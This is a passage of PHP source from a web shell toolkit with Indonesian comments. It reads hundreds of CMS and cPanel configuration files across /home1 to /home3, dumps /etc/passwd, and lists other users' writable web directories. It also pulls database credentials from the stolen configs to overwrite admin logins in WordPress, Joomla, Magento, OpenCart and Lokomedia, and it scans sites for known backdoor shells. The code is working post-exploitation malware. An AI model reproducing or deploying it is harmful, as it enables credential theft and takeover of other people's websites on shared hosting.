					"/home1/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home1/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home1/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home1/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home1/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home1/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home1/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home1/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home1/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home1/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home1/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home1/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home1/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home1/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home1/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home1/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home1/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home1/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home2/$user_cox/.my.cnf" => "cpanel",
					"/home2/$user_cox/.accesshash" => "WHM-accesshash",
					"/home2/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home2/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home2/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home2/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home2/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home2/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home2/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home2/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home2/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home2/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home2/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home2/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home2/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home2/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home2/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home2/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home2/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home2/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home2/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home2/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home2/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home2/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home2/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home2/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home2/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home2/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home2/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home2/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home2/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home2/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home2/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home2/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home2/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home2/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home2/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home2/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home2/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home2/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home2/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home2/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home2/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home2/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home2/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home2/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home2/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home2/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home2/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home2/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home2/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home2/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home2/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home2/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home2/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home2/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home2/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home2/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home2/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home2/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home2/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home2/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home2/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home2/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_cox/.my.cnf" => "cpanel",
					"/home3/$user_cox/.accesshash" => "WHM-accesshash",
					"/home3/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home3/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home3/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home3/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home3/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home3/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home3/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home3/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home3/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home3/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home3/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home3/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home3/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home3/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home3/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home3/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home3/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home3/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home3/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home3/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home3/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home3/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home3/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home3/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home3/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home3/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home3/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home3/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home3/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home3/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home3/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home3/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home3/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home3/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home3/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home3/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home3/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home3/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home3/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home3/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home3/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home3/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home3/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home3/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home3/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home3/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home3/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home3/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home3/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home3/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home3/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home3/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home3/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home3/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home3/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home3/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home3/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home3/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home3/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home3/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home3/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home3/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal"					
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("cox_config/$user_cox-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/cox_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_idx_jump) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])." :v";
	}
	echo "</div></pre>";
}
 elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Anazvr' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Anazvr' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}elseif($_GET['do'] == 'shelscan') {
	echo'<center><h2>Shell Finder</h2>
<form action="" method="post">
<input type="text" size="50" name="traget" value="http://www.site.com/"/>
<br>
<input name="scan" value="Start Scaning"  style="width: 215px;" type="submit">
</form><br>';
if (isset($_POST["scan"])) {  
$url = $_POST['traget'];
echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "Result :<br />";
$shells = array("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", 
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", 
